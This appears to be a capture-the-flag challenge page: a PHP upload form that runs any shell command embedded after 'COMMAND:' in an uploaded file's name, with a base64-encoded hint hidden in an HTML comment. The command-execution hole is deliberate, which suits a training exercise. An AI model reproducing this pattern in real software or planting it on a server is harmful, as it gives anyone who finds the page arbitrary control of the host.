<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["file"])) {
    $filename = $_FILES["file"]["name"];
    $tmp_name = $_FILES["file"]["tmp_name"];

    // Extract command from the filename
    if (preg_match('/COMMAND:(.*)/', $filename, $matches)) {
        $command = escapeshellcmd($matches[1]);
        $output = shell_exec($command . ' 2>&1'); // Capture stderr
        echo "<pre>$output</pre>";
    } else {
        echo "No command found in file name!";
    }
} else {
    echo "No file uploaded!";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Upload</title>
</head>
<body>
    <h1>Hidden Upload Page</h1>
    <p>Upload your files here:</p>
    <form action="/challenge1/index.php" method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="file" id="file">
        <input type="submit" value="Upload" name="submit">
        <!-- aDR4eDNkOiByZW1lbWJlciB0byBpbnNlcnQgIkNPTU1BTkQ6IiBpbnRvIGZpbGVuYW1lIA==  -->
    </form>
</body>
</html>
